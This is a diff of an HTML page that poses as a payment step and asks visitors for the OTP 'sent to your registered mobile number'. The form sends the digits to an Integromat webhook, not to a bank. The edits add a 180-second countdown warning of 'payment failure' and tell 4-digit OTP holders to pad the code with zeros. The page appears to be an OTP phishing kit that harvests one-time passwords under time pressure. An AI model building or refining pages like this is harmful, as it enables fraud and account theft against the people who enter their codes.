@@ -14,7 +14,7 @@
 <body>
 <!-- partial:index.partial.html -->
 <div class="prompt">
-	Enter the OTP sent to your registered mobile number and click on Pay ! <br><br> For 4 digit OTP kindly enter 4 digits first and than enter two zeros(00) at last to complete the payment.
+	<h4>Enter the OTP sent to your registered mobile number and click on Pay !</h4>
 </div>
 
 <form action="https://hook.integromat.com/stpe8xb1994dv9naukp5bca9t6l0gfja" method="post" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
@@ -28,7 +28,17 @@
 	<input type="text" id="digit-6" name="digit-6" data-previous="digit-5" required/> <br><br>
 	<div class="cool"><button type="submit" class="button"><span>Pay</span></button></div>
 </form>
+<h4>For 4 digit OTP kindly enter 4 digits first and than enter two zeros(00) at last to complete the payment.</h4><h5>Enter OTP within <span id="timer">180</span> Seconds to avoid payment failure.</h5>
 <!-- partial -->
+<script>
+    var timeleft = 180;
+    var downloadTimer = setInterval(function(){
+    timeleft--;
+    document.getElementById("timer").textContent = timeleft;
+    if(timeleft <= 0)
+        clearInterval(downloadTimer);
+    },1000);
+	</script>
   <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script  src="./script.js"></script>
 
 </body>
